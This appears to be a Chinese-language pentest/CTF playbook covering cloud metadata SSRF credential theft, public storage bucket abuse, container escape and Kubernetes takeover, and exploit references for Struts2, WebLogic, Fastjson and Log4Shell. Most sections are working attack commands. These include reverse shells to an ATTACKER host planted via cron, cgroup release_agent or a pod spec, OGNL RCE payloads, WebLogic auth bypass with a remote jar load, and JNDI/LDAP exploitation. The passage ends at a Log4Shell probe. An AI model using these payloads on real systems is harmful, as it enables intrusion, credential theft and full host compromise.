## [g-cloud] 云与容器——元数据、对象存储与逃逸
### [cloud-metadata] 云元数据服务利用 | medium | 云元数据;SSRF;凭证泄露 | 169.254.169.254;metadata
> 通过 SSRF 打 169.254.169.254 拉取 IAM 临时凭证，是云上第一利用面。

#### 这个条目的作用
云上虚拟机/容器都带一个「本地魔法地址」元数据服务（Metadata Service），里面躺着该实例的 IAM 临时凭证、用户数据、网络配置等。你利用 SSRF 或命令执行打到这个地址，就能匿名拿到一套合法凭证，用这套凭证去访问云上的对象存储、数据库、其他服务——相当于从「能打一个 URL」升级成「持有云账号内部身份」。

#### 前置条件
- 目标存在 SSRF（URL 参数可控制、能回显内容）或能在目标机器上执行命令/读文件。
- 知道目标部署在哪个云（看响应头、域名、备案信息；拿不到就先四个云全试一遍）。
- 目标那一侧没有把元数据地址拉黑（很多云厂商和 WAF 会拦，下面的绕过方法就是干这个的）。
- 用 curl 或浏览器直接请求靶机 URL 即可，本机不需要装云 CLI。

#### 第 1 步：判定目标云厂商
先跑一遍「全家桶」探测，哪个地址有响应就是哪个云：
```bash
# 直接在 SSRF 参数里逐个替换下面四个地址（或本机 curl 直连验证靶机可达性）
# AWS / Azure                    （Azure 同名但路径不同）
http://169.254.169.254/latest/meta-data/
# 阿里云
http://100.100.100.200/latest/meta-data/
# GCP（必须带专属请求头）
http://metadata.google.internal/computeMetadata/v1/
```
预期结果：某个地址返回 200 和目录列表（AWS 返回 `ami-id`、`hostname` 等含 `instance-id` 的行；阿里云返回 `meta-data/` 之类）。如果全部 403/404/超时，可能被 WAF 或云厂商安全组件拦了，跳到第 4 步绕过，或换一个 SSRF 入口。

#### 第 2 步：区分 IMDSv1 / IMDSv2（AWS 专属）
AWS 新实例默认开 IMDSv2：直接 GET 会 401。先在 SSRF 里发一个 PUT 换 token：
```bash
# 第 1 个请求：PUT 取 token（ttl 单位是秒，21600 = 6 小时）
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600

# 第 2 个请求：PUT 返回的 token 放进请求头再 GET
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
Header: X-aws-ec2-metadata-token: <上一步返回的 token>
```
预期结果：第一个请求返回一段随机字符串 token；第二个返回角色名列表。如果 PUT 返回 405（Method Not Allowed），说明是 IMDSv1，直接 GET 第 3 步的地址即可。

#### 第 3 步：拉取 IAM 临时凭证并验证
```bash
# AWS：先列角色名，再取该角色的完整凭证
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<RoleName>
# 返回 JSON：AccessKeyId / SecretAccessKey / Token / Expiration

# 阿里云：路径带 ram，角色名在 user-data 或 role 列表里
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/<RoleName>
curl http://100.100.100.200/latest/meta-data/user-data/
```
预期结果：拿到三件套 `AccessKeyId`、`SecretAccessKey`、`Token`（Token 一定会过期，注意 Expiration 字段，时间紧尽快用）。验证凭证是否有效：
```bash
# AWS
aws sts get-caller-identity --access-key-id AKIA... --secret-access-key ... --session-token ...
# 阿里云
aliyun sts GetCallerIdentity --access-key-id ... --access-key-secret ... --security-token ...
```
如果输出返回账号 ID 和角色 ARN → 凭证有效，接着去枚举 S3/OSS、数据库、密钥管理服务找高价值目标。

#### 第 4 步：元数据地址被过滤时的绕过
SSRF 常见的坑是「只拦了字面 IP 169.254.169.254」。按优先级逐个试：
```bash
# ① 十进制 IP：169.254.169.254 换算十进制 = 2852039166
http://2852039166/latest/meta-data/
# ② 域名变体：把 IP 拼进公共 DNS 服务
http://169.254.169.254.nip.io/latest/meta-data/
# ③ IPv6 映射写法（部分过滤器不认）
http://[::ffff:169.254.169.254]/latest/meta-data/
# ④ 重定向跳转：找一个自己能控制的 302 跳到这里
http://your-server/redirect?to=http://169.254.169.254/
```
预期结果：任一写法返回 200 元数据内容。如果还不行，试 URL 编码/双编码 `169.254.169.254`、`0x7f000001` 类十六进制写法，或者 SSRF 支持非 HTTP 协议时用 `gopher://` 去打了。DNS rebinding（先解析到合法域名再切回元数据 IP）是最后手段。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 请求全返回 403 | 云厂商 IMDS 做了防护（如 AWS 的 IMDSv2 强制） | 按第 2 步先 PUT 换 token 再带 header 请求 |
| 阿里云返回 `ram/security-credentials/` 后面是空 | 实例没有绑定 RAM 角色 | 去翻 `user-data` 和其他 meta-data 目录，实例没角色就找 Metrics/其他服务的默认凭证 |
| Azure 地址 404 | Azure 的元数据路径带版本号和头 | 用 `http://169.254.169.254/metadata/instance?api-version=2021-02-01` 并带 `Metadata: true` 头 |
| 拿到了凭证但 CLI 报 InvalidToken | Token 已过期或复制少了字符 | 重新拉一次，对照 Expiration 看是否过期；确认把 `Token`（不是 `SecurityToken` 拼写）传对 |
| 只拦 IP 字面量 | WAF 规则匹配了 `169.254` 字符串 | 换第 4 步的十进制/域名/nip.io 写法，或编码后再试 |

#### 实战要点
1. 拿到凭证第一件事是 `GetCallerIdentity` 确认有效性和权限范围，别拿凭证盲目扫全网。
2. 阿里云用户数据（`user-data`）常藏初始化脚本里的硬编码密钥；AWS 的 `iam/security-credentials/` 没角色时看看 `placement/`、`network/interfaces/macs/` 下面的信息。
3. GCP 的元数据响应头必须带 `Metadata-Flavor: Google`，很多 SSRF 工具不会自动加这个头，手动补上。
4. 凭证有效期通常几十分钟到几小时，操作顺序：验证 → 枚举对象存储/数据库 → 拿 flag 或高危数据，一次做完。
5. 元数据打不通不代表没戏：同一 VPC 里的其他机器、云控制台 API 也可能存在同类问题，结合容器逃逸条目继续深入。

> [!danger] 拿到的凭证可审计云上存储、数据库与服务，属高危凭证泄露——测试目的明确，勿越权外泄数据。
> [!tip] 凭证有效性验证：AWS `aws sts get-caller-identity`；阿里云 `aliyun sts GetCallerIdentity`。

### [cloud-oss-bucket] 对象存储桶未授权 | easy | 对象存储;未授权;信息泄露 | oss;s3;bucket
> 桶策略配错（公共读/写）导致匿名列目录、下文件甚至覆盖上传，是云上最常见的暴露面。

#### 这个条目的作用
对象存储（阿里云 OSS、AWS S3、腾讯云 COS）本质是把文件放在一个「桶（Bucket）」里。管理员经常图省事把桶设成公共读甚至公共写——这意味着任何人都能匿名列出桶里所有文件名、下载源码/备份/密钥文件，公共写还能往桶里塞恶意文件。CTF 里这通常是「信息泄露 → 拿源码 → 找漏洞」的关键跳板。

#### 前置条件
- 已经知道桶名（域名、页面里引用的资源 URL、JS 里的配置，或者字典爆破出来的）。
- 知道桶所在区域（S3 的 `s3.amazonaws.com` 或按 region 拆分；OSS 域名里直接带区域如 `oss-cn-hangzhou`）。
- 本机有 curl 即可，不需要云账号——测试的就是「匿名访问」。

#### 第 1 步：用页面资源推断桶名
打开目标网站，看静态资源（图片、JS、CSS）的 URL：
```txt
https://assets.example.com/js/app.js      → 可能是自定义域名绑定的桶
https://example-bucket.oss-cn-hangzhou.aliyuncs.com/logo.png  → 桶名 = example-bucket，区域 = cn-hangzhou
```
预期结果：从 URL 里拆出「桶名 + 区域 + 服务商」。如果资源用的是自定义域名（如 `assets.example.com`），先解析 DNS 看 CNAME 指向哪个云服务，再反推桶名。

#### 第 2 步：匿名列目录（校验公共读）
直接对桶根发一个 `list-type=2` 的列表请求：
```bash
# AWS S3（区域无关的主端点）
curl "https://BUCKET.s3.amazonaws.com/?list-type=2"
# 阿里云 OSS（区域按实际情况替换）
curl "https://BUCKET.oss-cn-hangzhou.aliyuncs.com/?list-type=2"
# 腾讯云 COS
curl "https://BUCKET.cos.ap-shanghai.myqcloud.com/?list-type=2"
```
预期结果：
- 返回 200 + 一串 `<Key>` 文件名 → **公共读**，直接进入第 3 步下载。
- 返回 403 AccessDenied 或 404 NoSuchBucket → 桶私有或桶名不存在，换候选桶名再试（字典爆破见第 5 步）。
- 返回 200 但 `<ListBucketResult>` 里 `<IsTruncated>` 为 true → 文件太多被截断，加参数翻页：`&continuation-token=<NextContinuationToken>`（S3）或 `&marker=<最后一个Key>`。

#### 第 3 步：下载高价值文件
把列出来的 Key 拼到桶域名后面逐个下载，优先找这些名字：
```bash
# 带 Authorization/凭据/备份/源码特征的文件
curl -O "https://BUCKET.s3.amazonaws.com/.env"
curl -O "https://BUCKET.s3.amazonaws.com/backup.zip"
curl -O "https://BUCKET.s3.amazonaws.com/web/src.zip"
curl -O "https://BUCKET.s3.amazonaws.com/config.json"
```
预期结果：`.env`（数据库口令、API Key）、源码压缩包、密钥文件落入本地。如果具体文件名不确定，把第 2 步的 Key 列表存下来，用脚本批量下载全部对象再本地 grep 敏感关键字（`password`、`access_key`、`BEGIN PRIVATE KEY`）。

#### 第 4 步：测试公共写与覆盖上传
换个角度，尝试往桶里写文件（匿名 PUT）：
```bash
# AWS S3：匿名 PUT 一个测试文件
curl -X PUT -d "test" "https://BUCKET.s3.amazonaws.com/ponytail-test.txt"
# 阿里云 OSS
curl -X PUT -d "test" "https://BUCKET.oss-cn-hangzhou.aliyuncs.com/ponytail-test.txt"
```
预期结果：返回 200 OK → **公共写**。此时如果桶绑定了可直接访问的域名（CDN、静态站点、团队内部工具页），你可以：覆盖同名 JS 实现存储型 XSS 投毒，或上传带后门的文件诱导管理员下载执行。若返回 403 → 只读或私有，别继续硬试写操作。

#### 第 5 步：桶名爆破与子域名接管
没拿到桶名时用字典爆破常见前缀，也可以用证书透明度日志反查：
```bash
# 简单字典循环（示例）：
for word in test backup prod dev www assets static files data; do
  curl -s -o /dev/null -w "$word -> %{http_code}\n" "https://$word.s3.amazonaws.com/?list-type=2"
done
# 证书透明度反查 *.s3 / *.oss 相关子域
crt.sh 搜索：%.s3.amazonaws.com  /  %.oss-cn-hangzhou.aliyuncs.com
```
预期结果：某个组合返回 200 → 桶存在且公共读。**子域名接管**场景：网站的 CNAME 指向 `xxx.oss-cn-hangzhou.aliyuncs.com`，但该桶已被删除 → 你注册同名桶，网站子域名流量落到你的桶上（可放钓鱼页/恶意 JS）。这一步影响面大，确认授权前不要真接管。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 列目录返回 XML 但 `<Key>` 为空 | 桶里有文件但列表权限受限 | 用已知道的文件名直接拼 URL 下载试试（读权限可能开了、列权限没开） |
| 403 AccessDenied | 桶策略私有 | 换候选桶名/区域再测；或结合元数据凭证（见 cloud-metadata）用合法身份访问 |
| 404 NoSuchBucket | 桶名拼错或不存在 | 核对服务商与区域；OSS 桶名全局唯一，试不同区域域名 |
| 能下载单个文件但列不了目录 | 对象级读权限开、ListBucket 权限关 | 直接下载已知 URL，别依赖列目录 |
| S3 自定义域名打不开 | 桶与域名跨区域 | 用 `https://s3.<region>.amazonaws.com/BUCKET/` 路径式访问或换正确 region 端点 |

#### 实战要点
1. 公共读的桶里，`backup`、`bak`、`old`、`release` 目录和带日期命名的压缩包是源码/密钥高发区，优先翻。
2. 公共写不等于能 getshell：要有「域名解析到桶」的前提，webshell 才能被访问执行；先确认桶是否绑定了可访问域名再投入精力。
3. 下载对象时保留原始路径结构（尤其 `web/`、`src/` 前缀），方便后面按源码目录审计。
4. 证书透明度（crt.sh）是找桶关联域名的高效入口，比纯字典爆破命中率高。
5. 每次测试公共写都写唯一标记文件（如 `ctf-test-<随机串>.txt`）并测完删除，别污染目标桶。

> [!warn] 只读枚举相对安全；公共写/接管类操作影响面大，务必先确认授权边界再动。
> [!tip] 域名枚举：证书透明度搜 `*.s3` / `*.oss` 别名，辅以 bucket 字典爆破常见桶名（bucket-finder 等）。

### [container-escape-k8s] 容器逃逸思路与 K8s 简述 | hard | 容器逃逸;提权;K8s | privileged;docker.sock;cgroup
> 高权限容器可通过宿主磁盘、cgroup release_agent、docker.sock 逃逸到宿主 root。

#### 这个条目的作用
拿到一个容器 shell 往往只是开始：容器里的 `/` 是隔离的，flag 或真实目标在宿主机上。这个条目教你判断「我在不在容器里、权限大不大」，然后走三条最经典的路（privileged 挂盘、cgroup release_agent、docker.sock）逃到宿主 root，最后讲拿到 pod 后怎么打 K8s 集群。

#### 前置条件
- 已经在目标容器里拿到了一个 shell（Webshell、RCE、docker exec 都行）。
- 容器内能执行命令、能读写 `/tmp`。
- 需要出网或至少能访问宿主的回连地址（反弹 shell 时）。全部命令在容器内执行，先不要动任何宿主文件。

#### 第 1 步：确认自己在容器里 + 探测特权
```bash
cat /proc/1/cgroup | head -5          # 输出含 docker / kubepods → 在容器里
ls -la /.dockerenv                     # 存在该文件 → 容器
grep CapEff /proc/self/status          # 记下 64 位十六进制值
mount | grep -E 'docker.sock|/dev/sd'  # 挂了宿主机敏感资源？
fdisk -l 2>/dev/null | head -20        # privileged 容器能看到宿主机磁盘
```
预期结果：确认容器身份。把 `CapEff` 值（如 `0000003fffffffff`）转二进制看第 21 位（0x200000 = CAP_SYS_ADMIN），或用 `capsh --print` 直接看（有 `capsh` 的话）。`fdisk -l` 能看到宿主机整块磁盘 → 就是 privileged，直接走第 2 步，最快。

#### 第 2 步：privileged 容器挂载宿主机磁盘
```bash
mkdir -p /tmp/h
# 先看有哪些分区（上一步 fdisk -l 的结果，sda1/sda2 等）
mount /dev/sda1 /tmp/h 2>/dev/null || mount /dev/sda2 /tmp/h
# 挂载成功就能看宿主文件系统了
ls /tmp/h/etc/shadow /tmp/h/root/
```
预期结果：`/tmp/h` 下出现宿主机的完整文件系统。此时逃逸宿主 root 有三选一：
```bash
# ① 直接 chroot 换根拿宿主 shell（最直白）
chroot /tmp/h bash
# ② 往宿主的 crontab 写反弹（/tmp/h 里看到的 / 就是宿主 /）
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /tmp/h/etc/cron.d/x
# ③ 修改宿主 root 的 authorized_keys 方便后续登录
echo 'ssh-rsa AAAAB3... your-key' >> /tmp/h/root/.ssh/authorized_keys
```
如果 `mount` 报 not permitted → 不是 privileged，跳过本步去第 3 步。

#### 第 3 步：cgroup v1 release_agent 逃逸（有 CAP_SYS_ADMIN 时）
capsh 显示有 CAP_SYS_ADMIN 但没挂盘权限时用这招：
```bash
mkdir /tmp/c && mount -t cgroup -o rdma cgroup /tmp/c
[ $? -eq 0 ] && echo "[+] cgroup mounted"
echo 1 > /tmp/c/notify_on_release
host_path=$(sed -n 's/.*perdir=\([^,]*\).*/\1/p' /proc/self/mountinfo)
echo "$host_path/cmd" > /tmp/c/release_agent
printf '#!/bin/sh\nbash -i >& /dev/tcp/ATTACKER/4444 0>&1\n' > /tmp/cmd
chmod +x /tmp/cmd
echo $$ > /tmp/c/cgroup.procs
```
预期结果：把当前 shell 进程写进 cgroup 后，cgroup 空时会触发 release_agent 执行 `/tmp/cmd`（该路径在宿主侧解析，即宿主的 `/tmp/cmd`）→ ATTACKER 的 4444 端口收到宿主 root 反弹 shell。没反应就检查：`cgroup.procs` 是否写入成功、`release_agent` 内容是否包含正确的 host_path、反弹地址是否可达。cgroup v2 机器（`/sys/fs/cgroup/cgroup.controllers` 存在）此方法不适用，换第 2/4 步。

#### 第 4 步：docker.sock 挂载逃逸
```bash
ls -la /var/run/docker.sock 2>/dev/null   # 存在且可写 → 直接控制宿主 Docker
docker -H unix:///var/run/docker.sock run --rm -v /:/host -it alpine chroot /host sh
# 没有 docker 客户端就用 curl 走 HTTP API
curl --unix-socket /var/run/docker.sock "http://localhost/containers/json"
```
预期结果：`chroot /host sh` 后拿到宿主 root shell，或者 `containers/json` 返回容器列表证明 API 可达。拿到 shell 后照第 2 步的 ②③ 写 crontab / authorized_keys 持久化。

#### 第 5 步：其他逃逸面（按版本试）
- CAP_SYS_PTRACE：`ptrace` 附加宿主进程注入 shellcode（难度高，工具 gdb/exploit 脚本）。
- 内核洞：Dirty Pipe（CVE-2022-0847，Linux 5.8–5.16.11）、OverlayFS（CVE-2021-3493）——先 `uname -r` 看内核版本，命中范围再上公开 exploit。
- runC CVE-2019-5736：Docker 18.09.2 之前的 runC，需能 `docker exec` 进容器。
预期结果：任一成功即宿主 root。内核洞影响宿主本身，CTF 里优先先试前几步无侵入的，内核 exploit 放最后。

#### 第 6 步：K8s 集群横向（拿到 node 之后）
```bash
# 容器内默认挂 SA token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# 用 token 访问 API server（kubernetes.default.svc 是集群内 DNS）
curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://kubernetes.default.svc/api/v1/namespaces/default/pods
# 看当前身份权限（等价 kubectl auth can-i --list）
curl -k -H "Authorization: Bearer $(cat .../token)" \
  https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews
```
预期结果：如果 RBAC 允许（常见误配），可以列 pod、创建 pod。创建挂载宿主 `/` 的 pod 即完成 pod → node 逃逸：
```yaml
# pod.yaml：把宿主根目录挂进容器
apiVersion: v1
kind: Pod
metadata:
  name: escape
spec:
  hostNetwork: true
  containers:
  - name: c
    image: alpine
    command: ["/bin/sh","-c","chroot /host bash -i >& /dev/tcp/ATTACKER/4444 0>&1"]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
```
其他高频误配：kubelet 10250 端口未授权（`curl -k https://NODE:10250/run/NAMESPACE/POD/CONTAINER -d "cmd=id"`）、dashboard 未授权、ETCD 2379 无鉴权（直接 dump 全部 secret）。常规链：拿 pod → 逃逸到 node root → 偷 node token/凭证 → 横向控制集群。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `mount /dev/sda1` 报 permission denied | 不是 privileged 容器 | 换第 3 步 cgroup 或第 5 步内核洞；检查 CapEff 是否含 CAP_SYS_ADMIN |
| release_agent 不回连 | cgroup v2 机器 / path 写错 / release 条件没满足 | 确认 `/sys/fs/cgroup/cgroup.controllers` 存在与否（v2 就放弃）；核对 host_path 提取的路径与你写文件的位置一致；写完释放 cgroup 才触发 |
| `docker.sock` 存在但 HTTP API 401 | 有 socket 但配置了 TLS/授权 | 多数 CTF 场景是无鉴权；有鉴权时回落到其他逃逸面 |
| 反弹 shell 秒断 | 容器内没有 bash / 网络不通 | 用 `/dev/tcp` 写法和 sh 兼容写法 `sh -i >& /dev/tcp/IP/4444 0>&1`；先本机 `nc -lvnp 4444` 确认监听 |
| chroot 后命令找不到 | 宿主 /bin 与容器环境差异 | 用绝对路径 `/bin/bash`、`/usr/bin/id`；或用 crontab 方式代替交互 shell |

#### 实战要点
1. 探测顺序按成本排：`fdisk -l` 一眼定 privileged → docker.sock 检查 → cgroup → 内核洞，从侵入性最低的开始。
2. 逃逸后第一优先是看 `/etc/shadow`、`/root/.ssh/`、进程环境变量（`/proc/*/environ` 常有明文密钥），拿 flag 或横向凭据。
3. 容器里 `capsh` 一般没有，用 `grep CapEff /proc/self/status` + 在线位计算器判断 CAP_SYS_ADMIN（第 21 位）。
4. K8s 场景先看 SA token 文件在不在，在就优先用 API 而非硬逃逸——RBAC 误配时 token 直接能建 pod，省掉内核洞。
5. 云上 K8s（EKS/GKE/ACK）拿到 node 后可顺手打同一 VPC 的元数据服务与对象存储（cloud-metadata / cloud-oss-bucket）。

> [!danger] 逃逸即宿主提权，属高危操作：先认清单点授权，逃逸后不碰沙箱外数据，留记录取证。
> [!tip] 云上 K8s（EKS/GKE/ACK）拿到 node 后可顺手打同一 VPC 的元数据服务与对象存储。

## [g-cve] 常见 CVE 速查表
### [cve-struts-weblogic] Struts2 与 WebLogic 速查 | medium | CVE;反序列化;OGNL | S2-045;S2-046;CVE-2020-2725;CVE-2020-14882
> Java 中间件两大出血点：Struts2 OGNL 注入与 WebLogic 反序列化/后台绕过。

#### 这个条目的作用
Struts2 和 WebLogic 是 Java 老牌中间件，历史漏洞极多且利用工具成熟。这个条目把最常考的 4 个洞（S2-045、S2-046、CVE-2020-2725、CVE-2020-14882/14883）按「触发条件 → 判定 → payload → 利用」讲清楚：S2 系列走 OGNL 表达式注入，WebLogic 走反序列化与后台认证绕过，两条路都能直接 RCE。

#### 前置条件
- 已确认目标跑的是 Struts2 或 WebLogic（响应头、路径特征：`/struts/`、`*.action`、`/console/`、`/wls-wsat/`）。
- Struts2 上传接口走 Jakarta Multipart 解析（S2-045 的核心前提，多数传统 struts 应用默认如此）。
- 反序列化利用需要出网（本机起 ysoserial/JNDI 服务或目标能回连）且目标 Java 版本兼容 gadget。
- 在授权范围内测试；先确认版本，别盲打高版本。

#### 第 1 步：Struts2 判定与 S2-045 触发
找到任意一个上传相关的 `.action` 接口（或全站行为 `.action`）。S2-045 是在 `Content-Type` 头里注入 OGNL 表达式，先用无害命令验证：
```bash
# 探测：把 Content-Type 头改成一个 OGNL 表达式
curl -i -X POST "http://TARGET/upload.action" \
  -H 'Content-Type: %{(#nike="multipart/form-data").(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#isx=(@java.lang.Runtime@getRuntime().exec("id")).(#isx.waitFor())?:(#isx)).(#cmd=(@java.lang.Runtime@getRuntime().exec("id").getInputStream())).(#o=@org.apache.commons.io.IOUtils@toString(#cmd))}'
```
预期结果：
- 响应体里回显了 `id` 命令的输出（`uid=0(root)...`）→ S2-045 确认，换 `id` 为反弹 shell 命令即 RCE。
- 返回正常上传页/错误但不回显 → 表达式执行了但没回显，用带外验证：把 `id` 换成 `curl http://your-dnslog/x` 或 `/usr/bin/wget http://ATTACKER:8000/$(hostname)`，在 ATTACKER 侧看是否收到请求。
- 返回 500 且日志里有 `Struts` 字样但无输出 → 可能修补过，试 S2-046（第 2 步）。

#### 第 2 步：S2-046 变体（filename 注入）
S2-046 与 S2-045 同源（同为 CVE-2017-5638），入口从 Content-Type 换到上传文件名：
```bash
curl -i -X POST "http://TARGET/upload.action" \
  -F 'file=@/etc/hosts;filename=%{#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("X-Out",@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream()))}'
```
预期结果：响应头里出现 `X-Out: uid=0(root)...` → 确认执行，同样把 `exec("id")` 换成反弹 shell。若 URL 编码被拦截，把 payload 整体 URL 编码后再放 filename 里试。

#### 第 3 步：WebLogic 反序列化（CVE-2020-2725）
先探测 wls-wsat 接口是否可达：
```bash
curl -i http://TARGET:7001/wls-wsat/CoordinatorPortType
```
预期结果：返回 200 且带 `<?xml` 的 SOAP 响应 → 接口开着。利用流程：
```bash
# ① 本机生成 ysoserial payload（CommonCollections 系，注意目标 JDK 版本选择 gadget）
java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,YmFzaC1p...}|{base64,-d}|{bash,-i}" > payload.bin
# ② POST 到接口（Content-Type: text/xml，body 是序列化 payload 包在 SOAP 里）
curl -X POST http://TARGET:7001/wls-wsat/CoordinatorPortType \
  -H "Content-Type: text/xml" --data-binary @payload.xml
```
预期结果：ATTACKER 侧收到反弹 shell。com.bsh / CC1-CC6 哪个 gadget 能通取决于 JDK 版本，逐个试；高版本 WebLogic（12.2.1.4+）此洞已修，先确认版本。

#### 第 4 步：WebLogic 后台认证绕过（CVE-2020-14882）
先探测 console 是否可达，再用路径穿越绕过登录：
```bash
# 探测
curl -i http://TARGET:7001/console/login/LoginForm.jsp
# 认证绕过（双编码 ..%252e）
curl -i "http://TARGET:7001/console/css/%252e%252e%252fconsole.portal"
```
预期结果：返回 200 且不是登录跳转 → 认证绕过成功，当前已是未授权访问后台管理接口。配合 RCE（CVE-2020-14883）：
```bash
# 利用 handle 参数 + 14883 的 com.tangosol.coherence.mvel2.util.Mlet 执行命令
curl "http://TARGET:7001/console/console.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.util.Mlet%3bhttp://ATTACKER:8000/evil.jar"
```
在 ATTACKER 侧放一个内容为命令执行逻辑的 jar，目标加载即 RCE。备用路径：`/console/images/%252e%252e%252fconsole.portal` 同款穿越，多路径都试。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| S2-045 请求直接 400/被 WAF 拦 | 头里带 `%{` 触发了拦截规则 | URL 编码 `%` 相关字符、拆分 OGNL 表达式、换 S2-046 入口或换回显方式 |
| OGNL 执行了但没回显 | Struts 对响应做了处理 / 无 IOUtils 类 | 改用带外（dnslog/wget 回连）验证与利用 |
| wls-wsat 404 | 版本已修或未部署该模块 | 确认版本；换 T3 协议（CVE-2020-2551）或后台路径打 |
| ysoserial 全部 gadget 不通 | JDK 版本与 gadget 不匹配 | `java -version` 确认目标 JDK 后选 CC1/CC3/CC6/CommonsBeanutils 对应链 |
| 绕过返回 404 | 路径编码层级不对 | 双编码是必须的：`%252e%252e%252f` 对应解码两层的 `../`；部分版本需要三层编码 |

#### 实战要点
1. S2 系列先跑无害 `id` 验证再上反弹 shell，避免盲打把目标打崩（Struts 应用崩了等于没有目标）。
2. WebLogic 默认 7001 端口；`/console` 和 `/wls-wsat` 两个入口都要探测，很多运维只修了其中一个。
3. 反序列化 payload 里命令先 base64 编码（`bash -c {echo,...}|{base64,-d}|{bash,-i}`），规避引号与特殊字符的解析问题。
4. 14882 认证绕过本身即可未授权访问后台（可能导致配置泄露），即使 14883 RCE 不通也单独上报。
5. 同类思路可延伸：S2-057（namespace 注入）、WebLogic T3（CVE-2020-2551）——判定与利用流程完全一致，换 payload 即可。

> [!tip] WebLogic 其他高频洞：T3 协议反序列化（CVE-2019-2725 / CVE-2020-2551），思路相同——ysoserial 指定 gadget + T3 握手。
> [!warn] 打反序列化前先确认目标版本与出网情况，别盲打高版本。

### [cve-fastjson-log4j] Fastjson 与 Log4j2 速查 | medium | CVE;反序列化;JNDI | Fastjson 1.2.24;1.2.47;Log4Shell
> 两条供应链级 RCE：Fastjson autoType 反序列化与 Log4j 的 JNDI 查表注入。

#### 这个条目的作用
Fastjson 和 Log4j2 是 Java 生态里几乎人手一个的库：Fastjson 负责 JSON 解析（接收请求体后 `JSON.parseObject`），Log4j2 负责打日志。两个库都因为「反序列化/日志内容里允许加载远程类」被打穿，且触发面极广——Fastjson 只要目标解析了你可控的 JSON，Log4j 只要你的输入进了日志（User-Agent 都会进日志）。核心是 JNDI：让目标去连你控制的 LDAP/RMI 服务，加载你提供的恶意类完成 RCE。

#### 前置条件
- 有公网 IP 的 VPS 或内网可达的攻击机（要起 LDAP/RMI 服务让目标来连）。
- 本机有 Java 环境和 JNDI 工具（如 marshalsec 起 LDAP、或 JNDI-Injection-Exploit 全家桶）。
- 目标出网（能访问你的 VPS），且目标 JDK 版本适合 JNDI 利用（高版本 JDK 限制多，见第 5 步）。
- 对 Fastjson：目标是老版本（≤1.2.24 或 ≤1.2.47）且解析你可控的 JSON。

#### 第 1 步：判定 Fastjson 版本
往目标接口 POST 一个带类型特征的 JSON，观察报错/回显差异：
```bash
# ① 差异特征：Fastjson 解析错误信息含 autoType / 详细堆栈；Jackson 不含
curl -X POST http://TARGET/api -H "Content-Type: application/json" \
  -d '{"@type":"java.lang.AutoCloseable"}'
# ② 版本指纹：1.2.47 之前会报
curl -X POST http://TARGET/api -H "Content-Type: application/json" \
  -d '{"a":"x"}'
```
预期结果：响应含 `com.alibaba.fastjson` 字样 → 确认 Fastjson。确认版本后决定用哪条 payload：≤1.2.24 直接打（第 2 步）；1.2.25–1.2.47 之间用缓存绕过（第 3 步）。响应不报错也可结合 DNSLog 探测（见第 4 步）盲打。

#### 第 2 步：起 JNDI 服务并打 1.2.24
```bash
# ① 起 HTTP 服务提供恶意 class（class 内容：static 块里执行命令）
#    用 JNDI-Injection-Exploit 直接生成，或手工编译：
#    public class Exploit { static { try { Runtime.getRuntime().exec("bash -c ..."); } catch(Exception e){} } }
python3 -m http.server 8000 --directory ./exploit-classes/ &

# ② 起 LDAP 服务（marshalsec），把 LDAP 查询重定向到上面的 HTTP
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER:8000/#Exploit" 1389
```
然后向目标发 Fastjson 1.2.24 直打 payload：
```bash
curl -X POST http://TARGET/api -H "Content-Type: application/json" \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER:1389/Exploit","autoCommit":true}'
```
预期结果：你的 HTTP 服务日志出现目标 IP 的 `GET /Exploit.class` 请求，目标执行了恶意类 → 攻击机收到反弹 shell。/Exploit 类没被请求 → LDAP 服务没被连上，检查 ATTACKER 地址与出网。

#### 第 3 步：1.2.47 缓存绕过打法
1.2.25+ 默认开了 autoType 校验，但 1.2.47 有个经 `java.lang.Class` 的缓存绕过：先塞类名进缓存，再触发：
```bash
# ① 先打一条把 JdbcRowSetImpl 送进映射缓存
curl -X POST http://TARGET/api -H "Content-Type: application/json" \
  -d '{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}'
# ② 再打正式 JNDI payload（LDAP 服务照第 2 步起）
curl -X POST http://TARGET/api -H "Content-Type: application/json" \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER:1389/Exploit","autoCommit":true}'
```
预期结果：两步都 200 后，HTTP 服务收到 class 请求。注意：≥1.2.48 此绕过失效；1.2.68 起默认关闭 autoType 基本不可直打。两条打不通且确认版本 ≤1.2.47 时，检查是否因为目标用 `JSON.parseObject(..., Feature.SupportNonPublicField)` 之类的差异。

#### 第 4 步：Log4Shell 判定（CVE-2021-44228）
Log4j 的测试更简单——日志里什么都能触发，先验证不打 RCE，只用 DNSLog 确认：
```bash
# ① 先拿一个 dnslog 域名（如 xxxx.dnslog.cn）
# ② 往所有可能进日志的位置注入（User-Agent 最稳，参数、请求体、Referer 也要试）
curl -i "http://TARGET/" \
  -H 'User-Agent: ${jndi:dns://test-x.dnslog.cn}'
# 解析型字段也一样测（如搜索接口的 q 参数）
